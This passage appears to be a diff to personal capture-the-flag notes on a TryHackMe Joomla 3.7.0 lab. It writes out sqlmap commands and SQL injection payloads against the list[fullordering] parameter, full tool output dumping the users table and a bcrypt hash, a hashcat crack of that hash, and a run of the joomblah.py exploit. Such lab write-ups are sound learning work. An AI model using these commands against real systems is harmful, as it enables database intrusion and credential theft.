@@ -595,10 +595,527 @@ I then found someone who ran a different command for SQL map WHICH I STILL NEED 
 
 command: sqlmap -u "http://192.168.1.14/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D joomladb -T '#__users' -C name,password --dump --batch
 
-I now tried the command (go back and read your notes)
+I now tried the command (go back and read your notes). The command didn't work. I tried again a day later and it actually found things.
 
->
+it outputted
+
+--------------------------------------------------------------------------
+
+available databases [5]:
+[*] information_schema
+[*] joomla
+[*] mysql
+[*] performance_schema
+[*] test
+-------------------------------------------------------------------------------------------------------------
+so I now want to enumerate the tables in the joomla database 
+----------------------------------------------------------------------------------------------------------
+┌──(kali㉿kali)-[~]
+└─$ sqlmap -u "http://10.10.74.3/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering] -D joomla --tables
+        ___
+       __H__                                                                                                                                          
+ ___ ___[)]_____ ___ ___  {1.9.2#stable}                                                                                                              
+|_ -| . [,]     | .'| . |                                                                                                                             
+|___|_  [,]_|_|_|__,|  _|                                                                                                                             
+      |_|V...       |_|   https://sqlmap.org                                                                                                          
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 14:24:47 /2025-04-25/
+
+[14:24:48] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (X11; U; Linux i686; pt-BR; rv:1.8.0.4) Gecko/20060608 Ubuntu/dapper-security Firefox/1.5.0.4' from file '/usr/share/sqlmap/data/txt/user-agents.txt'                                                                            
+[14:24:48] [INFO] resuming back-end DBMS 'mysql' 
+[14:24:48] [INFO] testing connection to the target URL
+[14:24:48] [WARNING] the web server responded with an HTTP error code (500) which could interfere with the results of the tests
+you have not declared cookie(s), while server wants to set its own ('eaa83fe8b963ab08ce9ab7d4a798de05=71sci5vi860...pq698ah107'). Do you want to use those [Y/n] y
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: list[fullordering] (GET)
+    Type: error-based
+    Title: MySQL >= 5.0 error-based - Parameter replace (FLOOR)
+    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT 9872 FROM(SELECT COUNT(*),CONCAT(0x716b787071,(SELECT (ELT(9872=9872,1))),0x7176626a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)
+    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT 7632 FROM (SELECT(SLEEP(5)))XhkY)
+---
+[14:24:50] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux CentOS 7
+web application technology: Apache 2.4.6, PHP 5.6.40
+back-end DBMS: MySQL >= 5.0 (MariaDB fork)
+[14:24:50] [INFO] fetching database names
+[14:24:50] [INFO] resumed: 'information_schema'
+[14:24:50] [INFO] resumed: 'joomla'
+[14:24:50] [INFO] resumed: 'mysql'
+[14:24:50] [INFO] resumed: 'performance_schema'
+[14:24:50] [INFO] resumed: 'test'
+available databases [5]:
+[*] information_schema
+[*] joomla
+[*] mysql
+[*] performance_schema
+[*] test
+
+[14:24:50] [INFO] fetching tables for database: 'joomla'
+[14:24:51] [INFO] retrieved: '#__assets'
+[14:24:51] [INFO] retrieved: '#__associations'
+[14:24:51] [INFO] retrieved: '#__banner_clients'
+[14:24:52] [INFO] retrieved: '#__banner_tracks'
+[14:24:52] [INFO] retrieved: '#__banners'
+[14:24:52] [INFO] retrieved: '#__categories'
+[14:24:52] [INFO] retrieved: '#__contact_details'
+[14:24:52] [INFO] retrieved: '#__content'
+[14:24:53] [INFO] retrieved: '#__content_frontpage'
+[14:24:53] [INFO] retrieved: '#__content_rating'
+[14:24:53] [INFO] retrieved: '#__content_types'
+[14:24:53] [INFO] retrieved: '#__contentitem_tag_map'
+[14:24:53] [INFO] retrieved: '#__core_log_searches'
+[14:24:54] [INFO] retrieved: '#__extensions'
+[14:24:54] [INFO] retrieved: '#__fields'
+[14:24:54] [INFO] retrieved: '#__fields_categories'
+[14:24:54] [INFO] retrieved: '#__fields_groups'
+[14:24:54] [INFO] retrieved: '#__fields_values'
+[14:24:55] [INFO] retrieved: '#__finder_filters'
+[14:24:55] [INFO] retrieved: '#__finder_links'
+[14:24:55] [INFO] retrieved: '#__finder_links_terms0'
+[14:24:55] [INFO] retrieved: '#__finder_links_terms1'
+[14:24:55] [INFO] retrieved: '#__finder_links_terms2'
+[14:24:56] [INFO] retrieved: '#__finder_links_terms3'
+[14:24:56] [INFO] retrieved: '#__finder_links_terms4'
+[14:24:56] [INFO] retrieved: '#__finder_links_terms5'
+[14:24:56] [INFO] retrieved: '#__finder_links_terms6'
+[14:24:56] [INFO] retrieved: '#__finder_links_terms7'
+[14:24:57] [INFO] retrieved: '#__finder_links_terms8'
+[14:24:57] [INFO] retrieved: '#__finder_links_terms9'
+[14:24:57] [INFO] retrieved: '#__finder_links_termsa'
+[14:24:57] [INFO] retrieved: '#__finder_links_termsb'
+[14:24:57] [INFO] retrieved: '#__finder_links_termsc'
+[14:24:58] [INFO] retrieved: '#__finder_links_termsd'
+[14:24:58] [INFO] retrieved: '#__finder_links_termse'
+[14:24:58] [INFO] retrieved: '#__finder_links_termsf'
+[14:24:58] [INFO] retrieved: '#__finder_taxonomy'
+[14:24:58] [INFO] retrieved: '#__finder_taxonomy_map'
+[14:24:59] [INFO] retrieved: '#__finder_terms'
+[14:24:59] [INFO] retrieved: '#__finder_terms_common'
+[14:24:59] [INFO] retrieved: '#__finder_tokens'
+[14:24:59] [INFO] retrieved: '#__finder_tokens_aggregate'
+[14:24:59] [INFO] retrieved: '#__finder_types'
+[14:25:00] [INFO] retrieved: '#__languages'
+[14:25:00] [INFO] retrieved: '#__menu'
+[14:25:00] [INFO] retrieved: '#__menu_types'
+[14:25:00] [INFO] retrieved: '#__messages'
+[14:25:00] [INFO] retrieved: '#__messages_cfg'
+[14:25:01] [INFO] retrieved: '#__modules'
+[14:25:01] [INFO] retrieved: '#__modules_menu'
+[14:25:01] [INFO] retrieved: '#__newsfeeds'
+[14:25:01] [INFO] retrieved: '#__overrider'
+[14:25:01] [INFO] retrieved: '#__postinstall_messages'
+[14:25:02] [INFO] retrieved: '#__redirect_links'
+[14:25:02] [INFO] retrieved: '#__schemas'
+[14:25:02] [INFO] retrieved: '#__session'
+[14:25:02] [INFO] retrieved: '#__tags'
+[14:25:02] [INFO] retrieved: '#__template_styles'
+[14:25:03] [INFO] retrieved: '#__ucm_base'
+[14:25:03] [INFO] retrieved: '#__ucm_content'
+[14:25:03] [INFO] retrieved: '#__ucm_history'
+[14:25:03] [INFO] retrieved: '#__update_sites'
+[14:25:03] [INFO] retrieved: '#__update_sites_extensions'
+[14:25:04] [INFO] retrieved: '#__updates'
+[14:25:04] [INFO] retrieved: '#__user_keys'
+[14:25:04] [INFO] retrieved: '#__user_notes'
+[14:25:04] [INFO] retrieved: '#__user_profiles'
+[14:25:04] [INFO] retrieved: '#__user_usergroup_map'
+[14:25:05] [INFO] retrieved: '#__usergroups'
+[14:25:05] [INFO] retrieved: '#__users'
+[14:25:05] [INFO] retrieved: '#__utf8_conversion'
+[14:25:05] [INFO] retrieved: '#__viewlevels'
+Database: joomla
+[72 tables]
++----------------------------+
+| #__assets                  |
+| #__associations            |
+| #__banner_clients          |
+| #__banner_tracks           |
+| #__banners                 |
+| #__categories              |
+| #__contact_details         |
+| #__content_frontpage       |
+| #__content_rating          |
+| #__content_types           |
+| #__content                 |
+| #__contentitem_tag_map     |
+| #__core_log_searches       |
+| #__extensions              |
+| #__fields_categories       |
+| #__fields_groups           |
+| #__fields_values           |
+| #__fields                  |
+| #__finder_filters          |
+| #__finder_links_terms0     |
+| #__finder_links_terms1     |
+| #__finder_links_terms2     |
+| #__finder_links_terms3     |
+| #__finder_links_terms4     |
+| #__finder_links_terms5     |
+| #__finder_links_terms6     |
+| #__finder_links_terms7     |
+| #__finder_links_terms8     |
+| #__finder_links_terms9     |
+| #__finder_links_termsa     |
+| #__finder_links_termsb     |
+| #__finder_links_termsc     |
+| #__finder_links_termsd     |
+| #__finder_links_termse     |
+| #__finder_links_termsf     |
+| #__finder_links            |
+| #__finder_taxonomy_map     |
+| #__finder_taxonomy         |
+| #__finder_terms_common     |
+| #__finder_terms            |
+| #__finder_tokens_aggregate |
+| #__finder_tokens           |
+| #__finder_types            |
+| #__languages               |
+| #__menu_types              |
+| #__menu                    |
+| #__messages_cfg            |
+| #__messages                |
+| #__modules_menu            |
+| #__modules                 |
+| #__newsfeeds               |
+| #__overrider               |
+| #__postinstall_messages    |
+| #__redirect_links          |
+| #__schemas                 |
+| #__session                 |
+| #__tags                    |
+| #__template_styles         |
+| #__ucm_base                |
+| #__ucm_content             |
+| #__ucm_history             |
+| #__update_sites_extensions |
+| #__update_sites            |
+| #__updates                 |
+| #__user_keys               |
+| #__user_notes              |
+| #__user_profiles           |
+| #__user_usergroup_map      |
+| #__usergroups              |
+| #__users                   |
+| #__utf8_conversion         |
+| #__viewlevels              |
++----------------------------+
+
+[14:25:05] [WARNING] HTTP error codes detected during run:
+500 (Internal Server Error) - 74 times
+[14:25:05] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/10.10.74.3'
+I
+
+finding the #__users table pretty interesting I looked into that
+
+┌──(kali㉿kali)-[~]
+└─$ sqlmap -u "http://10.10.151.132/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering] -D joomla -T "#__users" --columns
+        ___
+       __H__                                                                                                                                          
+ ___ ___["]_____ ___ ___  {1.9.2#stable}                                                                                                              
+|_ -| . [)]     | .'| . |                                                                                                                             
+|___|_  [)]_|_|_|__,|  _|                                                                                                                             
+      |_|V...       |_|   https://sqlmap.org                                                                                                          
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 16:25:04 /2025-04-25/
+
+[16:25:04] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.11 Safari/535.19' from file '/usr/share/sqlmap/data/txt/user-agents.txt'                                                              
+[16:25:04] [INFO] testing connection to the target URL
+[16:25:08] [WARNING] the web server responded with an HTTP error code (500) which could interfere with the results of the tests
+you have not declared cookie(s), while server wants to set its own ('eaa83fe8b963ab08ce9ab7d4a798de05=t7vvcpp79q5...vd8i2jqsu4'). Do you want to use those [Y/n] y
+[16:25:10] [INFO] checking if the target is protected by some kind of WAF/IPS
+[16:25:11] [INFO] testing if the target URL content is stable
+[16:25:11] [INFO] target URL content is stable
+[16:25:11] [INFO] heuristic (basic) test shows that GET parameter 'list[fullordering]' might be injectable (possible DBMS: 'MySQL')
+[16:25:11] [INFO] testing for SQL injection on GET parameter 'list[fullordering]'
+it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y
+[16:25:13] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[16:25:13] [WARNING] reflective value(s) found and filtering out
+[16:25:34] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
+[16:25:50] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
+[16:26:13] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
+[16:27:32] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
+[16:28:52] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
+[16:29:39] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
+[16:29:55] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
+[16:30:04] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[16:30:04] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
+[16:30:05] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
+[16:30:05] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
+[16:30:06] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
+[16:30:06] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
+[16:31:03] [INFO] testing 'Generic inline queries'
+[16:31:04] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
+[16:31:48] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
+[16:32:29] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
+[16:33:13] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
+[16:34:31] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
+[16:35:05] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
+[16:36:20] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
+[16:37:45] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
+[16:38:58] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+[16:40:24] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+[16:42:03] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET)'
+[16:42:05] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)'
+[16:42:07] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT)'
+[16:42:09] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT - original value)'
+[16:42:12] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int)'
+[16:42:14] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int - original value)'
+[16:42:16] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
+[16:42:20] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
+[16:42:24] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
+[16:42:24] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
+[16:42:24] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Stacked queries'
+[16:43:18] [INFO] testing 'MySQL < 5.0 boolean-based blind - Stacked queries'
+[16:43:18] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
+[16:44:13] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
+[16:44:53] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
+[16:45:13] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
+[16:46:09] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
+[16:47:05] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
+[16:48:02] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
+[16:48:57] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
+[16:49:52] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[16:50:48] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[16:51:44] [INFO] testing 'MySQL >= 5.0 (inline) error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[16:51:46] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+[16:52:41] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+[16:53:36] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
+[16:54:32] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
+[16:54:57] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[16:55:33] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
+[16:56:28] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'
+[16:56:55] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
+[16:57:33] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'
+[16:57:34] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'
+[16:57:35] [INFO] testing 'MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)'
+[16:57:36] [INFO] testing 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)'
+[16:57:37] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
+[16:57:38] [INFO] GET parameter 'list[fullordering]' is 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)' injectable 
+[16:57:38] [INFO] testing 'MySQL inline queries'
+[16:57:39] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
+[16:57:40] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
+[16:57:42] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
+[16:57:43] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
+[16:57:44] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
+[16:57:45] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
+[16:57:46] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+[16:57:47] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (query SLEEP)'
+[16:57:48] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SLEEP)'
+[16:57:49] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (SLEEP)'
+[16:57:50] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SLEEP - comment)'
+[16:57:51] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (SLEEP - comment)'
+[16:57:52] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP - comment)'
+[16:57:53] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (query SLEEP - comment)'
+[16:57:54] [INFO] testing 'MySQL < 5.0.12 AND time-based blind (BENCHMARK)'
+[16:57:55] [INFO] testing 'MySQL > 5.0.12 AND time-based blind (heavy query)'
+[16:57:56] [INFO] testing 'MySQL < 5.0.12 OR time-based blind (BENCHMARK)'
+[16:57:57] [INFO] testing 'MySQL > 5.0.12 OR time-based blind (heavy query)'
+[16:57:58] [INFO] testing 'MySQL < 5.0.12 AND time-based blind (BENCHMARK - comment)'
+[16:57:59] [INFO] testing 'MySQL > 5.0.12 AND time-based blind (heavy query - comment)'
+[16:58:00] [INFO] testing 'MySQL < 5.0.12 OR time-based blind (BENCHMARK - comment)'
+[16:58:01] [INFO] testing 'MySQL > 5.0.12 OR time-based blind (heavy query - comment)'
+[16:58:03] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind'
+[16:58:04] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (comment)'
+[16:58:05] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (query SLEEP)'
+[16:58:06] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (query SLEEP - comment)'
+[16:58:07] [INFO] testing 'MySQL AND time-based blind (ELT)'
+[16:58:08] [INFO] testing 'MySQL OR time-based blind (ELT)'
+[16:58:09] [INFO] testing 'MySQL AND time-based blind (ELT - comment)'
+[16:58:10] [INFO] testing 'MySQL OR time-based blind (ELT - comment)'
+[16:58:11] [INFO] testing 'MySQL >= 5.1 time-based blind (heavy query) - PROCEDURE ANALYSE (EXTRACTVALUE)'
+[16:58:12] [INFO] testing 'MySQL >= 5.1 time-based blind (heavy query - comment) - PROCEDURE ANALYSE (EXTRACTVALUE)'
+[16:58:13] [INFO] testing 'MySQL >= 5.0.12 time-based blind - Parameter replace'
+[16:58:14] [INFO] testing 'MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)'
+[16:58:27] [INFO] GET parameter 'list[fullordering]' appears to be 'MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)' injectable 
+[16:58:27] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
+[16:58:27] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
+[16:58:49] [INFO] testing 'Generic UNION query (random number) - 1 to 20 columns'
+[16:59:11] [INFO] testing 'Generic UNION query (NULL) - 21 to 40 columns'
+[16:59:31] [INFO] testing 'Generic UNION query (random number) - 21 to 40 columns'
+[16:59:50] [INFO] testing 'Generic UNION query (NULL) - 41 to 60 columns'
+[16:59:53] [INFO] testing 'Generic UNION query (random number) - 41 to 60 columns'
+[16:59:58] [INFO] testing 'Generic UNION query (NULL) - 61 to 80 columns'
+[17:00:04] [INFO] testing 'Generic UNION query (random number) - 61 to 80 columns'
+[17:00:25] [INFO] testing 'Generic UNION query (NULL) - 81 to 100 columns'
+[17:00:46] [INFO] testing 'Generic UNION query (random number) - 81 to 100 columns'
+[17:01:06] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
+[17:01:29] [INFO] testing 'MySQL UNION query (random number) - 1 to 20 columns'
+[17:01:50] [INFO] testing 'MySQL UNION query (NULL) - 21 to 40 columns'
+[17:02:12] [INFO] testing 'MySQL UNION query (random number) - 21 to 40 columns'
+[17:02:32] [INFO] testing 'MySQL UNION query (NULL) - 41 to 60 columns'
+[17:02:53] [INFO] testing 'MySQL UNION query (random number) - 41 to 60 columns'
+[17:03:14] [INFO] testing 'MySQL UNION query (NULL) - 61 to 80 columns'
+[17:03:34] [INFO] testing 'MySQL UNION query (random number) - 61 to 80 columns'
+[17:03:55] [INFO] testing 'MySQL UNION query (NULL) - 81 to 100 columns'
+[17:04:15] [INFO] testing 'MySQL UNION query (random number) - 81 to 100 columns'
+GET parameter 'list[fullordering]' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y
+sqlmap identified the following injection point(s) with a total of 2746 HTTP(s) requests:
+---
+Parameter: list[fullordering] (GET)
+    Type: error-based
+    Title: MySQL >= 5.0 error-based - Parameter replace (FLOOR)
+    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT 2528 FROM(SELECT COUNT(*),CONCAT(0x717a766271,(SELECT (ELT(2528=2528,1))),0x716a6b6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)
+    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT 4741 FROM (SELECT(SLEEP(5)))gIGU)
+---
+[18:14:46] [INFO] the back-end DBMS is MySQL
+[18:14:46] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)
+web server operating system: Linux CentOS 7
+web application technology: PHP 5.6.40, Apache 2.4.6
+back-end DBMS: MySQL >= 5.0 (MariaDB fork)
+[18:14:48] [INFO] fetching database names
+[18:14:48] [INFO] retrieved: 'information_schema'
+[18:14:48] [INFO] retrieved: 'joomla'
+[18:14:48] [INFO] retrieved: 'mysql'
+[18:14:49] [INFO] retrieved: 'performance_schema'
+[18:14:49] [INFO] retrieved: 'test'
+available databases [5]:
+[*] information_schema
+[*] joomla
+[*] mysql
+[*] performance_schema
+[*] test
+
+[18:14:49] [INFO] fetching columns for table '#__users' in database 'joomla'
+[18:14:49] [WARNING] unable to retrieve column names for table '#__users' in database 'joomla'
+do you want to use common column existence check? [y/N/q] y
+[18:14:52] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
+which common columns (wordlist) file do you want to use?
+[1] default '/usr/share/sqlmap/data/txt/common-columns.txt' (press Enter)
+[2] custom
+> 1
+[18:14:56] [INFO] checking column existence using items from '/usr/share/sqlmap/data/txt/common-columns.txt'
+[18:14:56] [INFO] adding words used on web page to the check list
+please enter number of threads? [Enter for 1 (current)] 
+
+[18:15:00] [WARNING] running in a single-thread mode. This could take a while
+[18:15:00] [INFO] retrieved: id                                                                                                                      
+[18:15:00] [INFO] retrieved: name                                                                                                                    
+[18:15:01] [INFO] retrieved: username                                                                                                                
+[18:15:04] [INFO] retrieved: email                                                                                                                   
+[18:15:36] [INFO] retrieved: password                                                                                                                
+[18:21:56] [INFO] retrieved: params                                                                                                                  
+Table: joomla.#__users
+[6 columns]
++----------+-------------+
+| Column   | Type        |
++----------+-------------+
+| name     | non-numeric |
+| email    | non-numeric |
+| id       | numeric     |
+| params   | numeric     |
+| password | non-numeric |
+| username | non-numeric |
++----------+-------------+
+
+--------------------------------------------------------------------
+we now have columns password and username
+so we can search for them with the following sql map commands:
+
+ sqlmap -u "http://10.10.151.132/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering] -D joomla -T "#__users" -C username --dump
+
+which outputted the following:
+
+[20:18:34] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux CentOS 7
+web application technology: Apache 2.4.6, PHP 5.6.40
+back-end DBMS: MySQL >= 5.0 (MariaDB fork)
+[20:18:34] [INFO] fetching database names
+[20:18:34] [INFO] resumed: 'information_schema'
+[20:18:34] [INFO] resumed: 'joomla'
+[20:18:34] [INFO] resumed: 'mysql'
+[20:18:34] [INFO] resumed: 'performance_schema'
+[20:18:34] [INFO] resumed: 'test'
+available databases [5]:
+[*] information_schema
+[*] joomla
+[*] mysql
+[*] performance_schema
+[*] test
+
+[20:18:34] [INFO] fetching entries of column(s) 'username' for table '#__users' in database 'joomla'
+[20:18:35] [INFO] retrieved: 'jonah'
+Database: joomla
+Table: #__users
+[1 entry]
++----------+
+| username |
++----------+
+| jonah    |
++----------+
+
+here we see a jonah user
+
+ sqlmap -u "http://10.10.151.132/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering] -D joomla -T "#__users" -C password --dump
+
+-----------------------------------------
+which outputted the following:
+[20:13:26] [INFO] retrieved: 'test'
+available databases [5]:
+[*] information_schema
+[*] joomla
+[*] mysql
+[*] performance_schema
+[*] test
+
+[20:13:26] [INFO] fetching entries of column(s) 'password' for table '#__users' in database 'joomla'
+[20:13:26] [INFO] retrieved: '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm'
+Database: joomla
+Table: #__users
+[1 entry]
++--------------------------------------------------------------+
+| password                                                     |
++--------------------------------------------------------------+
+| $2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm |
++--------------------------------------------------------------+
+
+[20:13:26] [INFO] table 'joomla.`#__users`' dumped to CSV file '/home/kali/.local/share/sqlmap/output/10.10.116.31/dump/joomla/#__users.csv'
+[20:13:26] [WARNING] HTTP error codes detected during run:
+500 (Internal Server Error) - 2712 times
+[20:13:26] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/10.10.116.31'
+
+[*] ending @ 20:13:26 /2025-04-28/
+
+
+this has was used to find the password:
+
+┌──(kali㉿kali)-[~]
+└─$ hashcat -m 3200 hash.txt ~/Desktop/rockyou.txt --show
+$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm:spiderman123
+
+---------------------------------------------------------------------
+here we have a hash in the passwords column  SQL map found
 -------------------------------------------------------------------------
+
+there is also this script I found which did the same thing
+
+https://github.com/teranpeterson/Joomblah/blob/master/joomblah.py
+
+┌──(kali㉿kali)-[~/Joomblah]
+└─$ python3 joomblah.py 10.10.116.31:80
+/home/kali/Joomblah/joomblah.py:208: SyntaxWarning: invalid escape sequence '\ '
+  logo = """
+
+WARNING: URL protocol not provided. Assuming http.
+Fetching CSRF token
+Testing SQLi
+Found table: fb9j5_users
+Extracting users from fb9j5_users
+Found user ['811', 'Super User', 'jonah', 'jonah@tryhackme.com', '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm', '', '']
+
+
+Extracting sessions from fb9j5_session
+
 gubuster scan
 ------------------------------------------------------------------------------------------------------------
 Gobuster v3.6
@@ -633,4 +1150,221 @@ Progress: 220560 / 220561 (100.00%)
 ===============================================================
 Finished
 ===============================================================
-                                                                     
+
+
+After enumerating directories further I found http://10.10.108.40/administrator/manifests/files/joomla.xml
+
+which housed joomla info and sure enough <version>3.7.0</version>, i kept digging around the manifests files
+
+----------------------------------------------------------------
